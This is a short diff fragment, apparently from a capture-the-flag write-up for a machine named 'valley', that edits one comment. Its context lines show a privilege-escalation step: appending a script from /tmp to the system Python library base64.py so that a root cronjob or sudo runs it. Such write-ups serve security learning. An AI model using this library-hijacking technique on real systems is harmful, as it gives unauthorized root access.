@@ -330,7 +330,7 @@ valley@valley:~$ cat /dev/null > base64.py
 # without touching file
 valley@valley:~$ cat /tmp/root.py >> /usr/lib/python3.8/base64.py
 
-# while executing file do not enter password
+# while executing file do not enter password or let the cronjob do their job
 valley@valley:~$ sudo ./base64.py
 ``` 
 ```bash
